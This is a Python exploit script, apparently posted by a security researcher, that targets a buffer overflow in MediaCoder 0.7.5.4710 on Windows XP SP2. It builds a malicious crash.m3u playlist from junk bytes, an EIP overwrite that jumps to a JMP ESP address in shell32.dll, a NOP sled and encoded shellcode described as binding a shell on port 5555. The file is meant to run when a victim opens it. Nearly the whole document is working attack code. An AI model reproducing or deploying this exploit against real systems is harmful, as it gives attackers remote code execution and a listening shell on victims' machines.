#media coder 0.7.5.4710 0 day buffer overflow exploit
#vulnerble application link http://www.mediacoderhq.com/dlfull.htm
#tested on XP SP2
#author abhishek lyall - abhilyall[at]gmail[dot]com
#web - http://www.aslitsecurity.com/
#blog - http://www.aslitsecurity.blogspot.com/
#!/usr/bin/python
# to exploit load the crash.m3u file and double click on it 

filename = "crash.m3u"

junk = "\x41" * 256
eip = "\x65\x82\xa5\x7c"     # JMP ESP shell32.dll
nop = "\x90" * 12
# port bind 5555 shellcode
scode = ("\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
            "\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
            "\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
            "\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
            "\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x46\x4b\x4e"
            "\x4d\x54\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x36\x4b\x48"
            "\x4e\x36\x46\x32\x46\x32\x4b\x48\x45\x34\x4e\x43\x4b\x58\x4e\x37"
            "\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x58\x4f\x44\x4a\x51\x4b\x58"
            "\x4f\x45\x42\x42\x41\x30\x4b\x4e\x49\x54\x4b\x38\x46\x43\x4b\x58"
            "\x41\x50\x50\x4e\x41\x43\x42\x4c\x49\x49\x4e\x4a\x46\x58\x42\x4c"
            "\x46\x37\x47\x30\x41\x4c\x4c\x4c\x4d\x50\x41\x50\x44\x4c\x4b\x4e"
            "\x46\x4f\x4b\x43\x46\x45\x46\x32\x4a\x42\x45\x37\x45\x4e\x4b\x58"
            "\x4f\x35\x46\x42\x41\x30\x4b\x4e\x48\x36\x4b\x48\x4e\x50\x4b\x54"
            "\x4b\x38\x4f\x45\x4e\x31\x41\x50\x4b\x4e\x43\x30\x4e\x52\x4b\x38"
            "\x49\x38\x4e\x46\x46\x32\x4e\x41\x41\x36\x43\x4c\x41\x43\x4b\x4d"
            "\x46\x46\x4b\x48\x43\x54\x42\x43\x4b\x48\x42\x54\x4e\x50\x4b\x48"
            "\x42\x37\x4e\x31\x4d\x4a\x4b\x38\x42\x34\x4a\x30\x50\x45\x4a\x46"
            "\x50\x58\x50\x54\x50\x50\x4e\x4e\x42\x35\x4f\x4f\x48\x4d\x48\x46"
            "\x43\x35\x48\x36\x4a\x46\x43\x33\x44\x53\x4a\x46\x47\x47\x43\x47"
            "\x44\x53\x4f\x35\x46\x45\x4f\x4f\x42\x4d\x4a\x46\x4b\x4c\x4d\x4e"
            "\x4e\x4f\x4b\x33\x42\x45\x4f\x4f\x48\x4d\x4f\x55\x49\x48\x45\x4e"
            "\x48\x36\x41\x58\x4d\x4e\x4a\x30\x44\x50\x45\x35\x4c\x56\x44\x30"
            "\x4f\x4f\x42\x4d\x4a\x56\x49\x4d\x49\x50\x45\x4f\x4d\x4a\x47\x45"
            "\x4f\x4f\x48\x4d\x43\x35\x43\x35\x43\x55\x43\x45\x43\x35\x43\x54"
            "\x43\x35\x43\x34\x43\x35\x4f\x4f\x42\x4d\x48\x36\x4a\x36\x45\x31"
            "\x43\x4b\x48\x56\x43\x35\x49\x38\x41\x4e\x45\x39\x4a\x46\x46\x4a"
            "\x4c\x51\x42\x57\x47\x4c\x47\x35\x4f\x4f\x48\x4d\x4c\x46\x42\x41"
            "\x41\x55\x45\x35\x4f\x4f\x42\x4d\x4a\x36\x46\x4a\x4d\x4a\x50\x52"
            "\x49\x4e\x47\x55\x4f\x4f\x48\x4d\x43\x55\x45\x55\x4f\x4f\x42\x4d"
            "\x4a\x46\x45\x4e\x49\x44\x48\x58\x49\x44\x47\x55\x4f\x4f\x48\x4d"
            "\x42\x45\x46\x35\x46\x45\x45\x45\x4f\x4f\x42\x4d\x43\x49\x4a\x36"
            "\x47\x4e\x49\x47\x48\x4c\x49\x57\x47\x35\x4f\x4f\x48\x4d\x45\x55"
            "\x4f\x4f\x42\x4d\x48\x46\x4c\x46\x46\x46\x48\x36\x4a\x36\x43\x56"
            "\x4d\x36\x49\x48\x45\x4e\x4c\x56\x42\x45\x49\x55\x49\x52\x4e\x4c"
            "\x49\x38\x47\x4e\x4c\x36\x46\x44\x49\x38\x44\x4e\x41\x33\x42\x4c"
            "\x43\x4f\x4c\x4a\x50\x4f\x44\x44\x4d\x42\x50\x4f\x44\x54\x4e\x32"
            "\x43\x49\x4d\x48\x4c\x47\x4a\x43\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36"
            "\x44\x57\x50\x4f\x43\x4b\x48\x51\x4f\x4f\x45\x37\x46\x54\x4f\x4f"
            "\x48\x4d\x4b\x45\x47\x45\x44\x55\x41\x35\x41\x45\x41\x35\x4c\x56"
            "\x41\x30\x41\x35\x41\x35\x45\x45\x41\x55\x4f\x4f\x42\x4d\x4a\x46"
            "\x4d\x4a\x49\x4d\x45\x50\x50\x4c\x43\x45\x4f\x4f\x48\x4d\x4c\x46"
            "\x4f\x4f\x4f\x4f\x47\x53\x4f\x4f\x42\x4d\x4b\x48\x47\x35\x4e\x4f"
            "\x43\x38\x46\x4c\x46\x36\x4f\x4f\x48\x4d\x44\x35\x4f\x4f\x42\x4d"
            "\x4a\x36\x42\x4f\x4c\x48\x46\x30\x4f\x35\x43\x35\x4f\x4f\x48\x4d"
            "\x4f\x4f\x42\x4d\x5a"
)			
			
junk2 = "\x90" * 600

textfile = open(filename , 'w')
textfile.write(junk+eip+nop+scode+junk2)
textfile.close()